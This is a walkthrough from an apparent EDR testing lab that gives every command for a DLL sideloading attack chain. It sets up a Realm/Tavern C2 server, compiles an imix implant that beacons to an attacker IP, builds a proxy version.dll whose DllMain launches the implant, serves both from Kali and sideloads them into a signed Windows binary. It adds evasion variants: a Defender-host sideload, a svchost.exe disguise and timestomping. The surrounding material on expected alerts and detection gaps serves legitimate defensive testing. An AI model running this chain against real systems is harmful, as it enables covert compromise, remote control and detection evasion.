# Test: DLL Sideloading (search-order hijack) — Kali Implant Setup → Windows Launch + Evasion

One technique per directory; this one is the **DLL sideloading chain**. Everything you need
is in this folder:

```
dll-sideload/
  WALKTHROUGH.md                 <- you are here
  kali-setup.sh                  optional: one-time Kali tooling install
  kali-build.sh                  optional: scripted version of the Kali steps below
  victim-stage-and-launch.ps1    Windows: find signed host, stage files, launch the sideload
  victim-evasion-variants.ps1    Windows: evasion variants A/B/C
  victim-cleanup.ps1             Windows: full cleanup + fresh baseline
```

| Role | Machine | Needs |
|---|---|---|
| **KALI** (attacker) | your Kali box (example `172.16.69.109`) | git, Go ≥1.21, Rust toolchain |
| **VICTIM** (target) | this Windows Server, EDR at http://127.0.0.1:8420 | nothing extra |

**The chain in one picture:**

```
KALI                                   VICTIM (EDR watching)
────                                   ─────────────────────
build proxy version.dll   ──HTTP──▶  C:\Users\Public\SigCheck\version.dll
build imix implant        ──HTTP──▶  C:\Users\Public\sysupd.exe
(copy signed host exe)                C:\Users\Public\SigCheck\sigverif.exe   ← signed, clean
                                                │
                                     run sigverif.exe ──▶ loads YOUR version.dll
                                                │          (DLL search order: app dir first)
                                                └─▶ DllMain ──▶ spawns sysupd.exe ──▶ beacons
```

---

## PART 1 — KALI: implant setup, every command shown

### Step 0 — one-time tooling (5 min)

```bash
# Rust + Windows cross-compiler
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
cargo install cargo-zigbuild          # cross-compile without a Windows box
sudo apt update && sudo apt install -y golang mingw-w64
```

(Or just run `./kali-setup.sh` — it does the same.)

### Step 1 — clone Realm and start the Tavern server

```bash
git clone https://github.com/spellshift/realm.git ~/realm
cd ~/realm
git checkout -b latest $(git tag | tail -1)

# build + run the C2 server (leave it running in this terminal)
go run ./tavern
```

Tavern serves its public key at `http://<KALI_IP>:<port>/status` — the implant build below
fetches it automatically. **Open a second terminal** for the rest.

### Step 2 — build the imix implant (callback pointed at this Kali box)

```bash
cd ~/realm/implants/imix

# the callback URI is BAKED INTO the binary at compile time:
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release

mkdir -p ~/sideload-lab
cp target/release/imix.exe ~/sideload-lab/sysupd.exe

# optional variants for later tests:
cp target/release/imix.exe ~/sideload-lab/imix_stripped.exe
strip ~/sideload-lab/imix_stripped.exe                       # variant: stripped build
cargo build --release --features win_service                 # variant: service build
cp target/release/imix.exe ~/sideload-lab/imix_svc.exe
```

Useful compile-time switches (see `docs.realm.pub/user-guide/imix`):
- `IMIX_CALLBACK_URI` — where it beacons (above)
- `IMIX_GUARDRAILS` — e.g. `IMIX_GUARDRAILS=file:/C:/lab/marker` → exits unless that file exists
- `IMIX_CONFIG` — path to a YAML enabling HTTP/QUIC/DNS transports with `interval`/`jitter`

### Step 3 — build the proxy `version.dll`

The proxy forwards the real DLL's exports (so the signed host loads cleanly) and runs your
code in `DllMain`. The crate lives at `poc-scripts/attacker/proxy-dll/` in the repo:

```bash
cp -r /path/to/repo/poc-scripts/attacker/proxy-dll ~/sideload-lab/proxy-dll
cd ~/sideload-lab/proxy-dll

# cross-compile for Windows:
cargo zigbuild --release --target x86_64-pc-windows-gnu
# fallback if zigbuild fails: cargo build --release --target x86_64-pc-windows-gnu

cp target/x86_64-pc-windows-gnu/release/proxy_dll.dll ~/sideload-lab/version.dll
```

Two lines in `proxy-dll/src/lib.rs` you may need to touch:
- `REAL_PATH` — which genuine DLL you're proxying (`version.dll` here; `mpclient.dll` /
  `mpsvc.dll` for the Defender variant)
- the `fwd!` list — one line per export the host binds; check with
  `objdump -p C:/Windows/System32/version.dll` (on Windows: `dumpbin /exports`).
  The default three cover most VERSION.dll hosts.
- `DllMain` — as shipped it writes `sideload_proof.txt` (benign). To run the full chain,
  uncomment the `sysupd.exe` spawn line before building.

### Step 4 — serve everything to the victim

```bash
cd ~/sideload-lab
python3 -m http.server 8000
# victim-reachable URLs:
#   http://172.16.69.109:8000/sysupd.exe     (implant)
#   http://172.16.69.109:8000/version.dll    (proxy)
```

(`./kali-build.sh` wraps steps 2–4 if you prefer one command: it **asks for the IP to bake
into the implant callback first** — shows the auto-detected address as the default, press
Enter to accept or type the right one (`./kali-build.sh 172.16.69.109` skips the prompt) —
then builds both artifacts and starts the server, with a benign stand-in if Realm isn't
cloned.)

---

## PART 2 — VICTIM (this Windows Server): stage, launch, test

### Step 5 — EDR up + fresh baseline (elevated PowerShell)

```powershell
cd C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design
python -m edr                                  # if not already running
curl.exe -X POST http://127.0.0.1:8420/api/baseline
```

Keep the console open: http://127.0.0.1:8420 — alerts appear in the LIVE panel (bottom-right).

### Step 6 — stage the sideload kit

```powershell
cd C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design\custom-walkthrough\dll-sideload
.\victim-stage-and-launch.ps1 -Kali 172.16.69.109 -Mode Stage
```

What it does: scans System32 for a **signed exe that imports VERSION.dll**, copies it to
`C:\Users\Public\SigCheck\`, downloads your `version.dll` beside it and `sysupd.exe` to
`C:\Users\Public\`. **Watch the LIVE panel while it runs** — the drops should already fire
`SIG-REALM-IMIX` / `SIG-RUST-IMPLANT` (on-write scan, before anything executes).

### Step 7 — launch the sideload (the main event)

```powershell
.\victim-stage-and-launch.ps1 -Kali 172.16.69.109 -Mode Launch
```

Confirm the hijack:

```powershell
Test-Path C:\Users\Public\sideload_proof.txt   # True = your DLL ran inside the signed process
```

**Expected alerts, in order:**
1. `EVT-4688-TEMP` (high) — kernel-fed 4688 sees `sysupd.exe` launch from a user path
2. `PROG-IMPLANT-LAUNCH` (critical) — the WMI poll scans the launched image
3. `NET-BEACON` (critical) — callback cadence after ~1–2 min (real imix only)

**The honest gap:** nothing says "unsigned DLL loaded into a signed process" — no
module-load telemetry yet. You catch the consequences, not the hijack. That gap is the
finding this test exists to document.

### Step 8 — scoreboard

```powershell
..\..\poc-scripts\victim\check-alerts.ps1
```

### Step 9 — evasion variants (one at a time; cleanup between)

```powershell
.\victim-evasion-variants.ps1 -Variant A    # Defender-host sideload (LockBit delivery)
.\victim-evasion-variants.ps1 -Variant B    # fake system-binary name (svchost.exe)
.\victim-evasion-variants.ps1 -Variant C    # deep path + timestamp spoof
```

| Variant | Technique | Evades | MUST still fire |
|---|---|---|---|
| **A** | proxy chain hosted by Defender's signed `MpCmdRun.exe` + `mpclient.dll` | host-binary suspicion (Defender binaries are trusted) | `EVT-DEFENDER-SIDELOAD` (critical): Defender binary outside its install path |
| **B** | implant renamed `svchost.exe` in `C:\Users\Public` | name-based rules, analyst eyeballs | `EVT-4688-TEMP` (path-based, rename-proof); SIG rules (byte-based) |
| **C** | `C:\Users\Public\Intel\DriverStore\` + backdated timestamps | shallow scanning, mtime caches | `EVT-4688-TEMP` (still under \Users\Public\); timestomping itself = filed gap |

B and C going undetected = real detection bugs, not gaps. A tests the dedicated rule.

### Step 10 — cleanup

```powershell
.\victim-cleanup.ps1      # kills staged processes, removes every artifact,
                          # re-baselines, verifies a clean audit
```

---

## Troubleshooting

- **Host flashes and exits, no proof file** → proxy is missing an export the host binds:
  extend the `fwd!` list (step 3), rebuild, re-stage.
- **No `sysupd.exe` launch alert** → confirm the EDR is up and the file landed under
  `C:\Users\Public` or `%TEMP%` (the scanned roots).
- **Kali `zigbuild` fails** → `rustup target add x86_64-pc-windows-gnu`, install `mingw-w64`,
  build with `--target x86_64-pc-windows-gnu` instead.
- **imix exits immediately** → a `IMIX_GUARDRAILS` value was compiled in that doesn't match
  this host, or Tavern isn't reachable at the baked-in URI (`curl` the `/status` endpoint).
